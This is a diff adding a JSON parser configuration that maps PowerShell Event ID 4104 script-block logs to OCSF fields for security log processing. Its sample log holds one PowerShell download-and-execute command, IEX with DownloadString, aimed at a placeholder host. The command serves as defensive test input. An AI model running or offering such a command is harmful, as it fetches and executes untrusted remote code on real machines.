@@ -1,0 +1,26 @@
+{
+  "parser_id": "WIN-PWSH-4104",
+  "source_name": "Microsoft-Windows-PowerShell",
+  "os_family": "Windows",
+  "category": "Process Activity",
+  "ocsf_class_uid": 1007,
+  "activity_id": 1,
+  "activity_name": "Launch",
+  "description": "PowerShell Event ID 4104 — script block logging (executed script content).",
+  "identifiers": {
+    "required_substrings": ["PowerShell", "Event ID:", "4104"],
+    "regex_signature": "Source:\\s*Microsoft-Windows-PowerShell[\\s\\S]*?Event ID:\\s*4104\\b",
+    "known_processes": ["Microsoft-Windows-PowerShell", "PowerShell"],
+    "confidence_weight": 1.0
+  },
+  "ngre_pattern": "Source:\\s*Microsoft-Windows-PowerShell[\\s\\S]*?Event ID:\\s*(?P<event_id>4104)\\b[\\s\\S]*?Computer:\\s*(?P<computer>[^\\r\\n]+)[\\s\\S]*?ScriptBlockText:\\s*(?P<script_block>[^\\r\\n]+)",
+  "field_mapping": {
+    "computer": "device.hostname",
+    "script_block": "actor.process.cmd_line"
+  },
+  "static_fields": {
+    "actor.process.name": "powershell.exe"
+  },
+  "sample_log": "Log Name:      Microsoft-Windows-PowerShell/Operational\nSource:        Microsoft-Windows-PowerShell\nEvent ID:      4104\nLevel:         Warning\nComputer:      WKS01.corp.local\nCreating Scriptblock text (1 of 1):\nScriptBlockText:  IEX (New-Object Net.WebClient).DownloadString('http://x')",
+  "version": "1.0"
+}
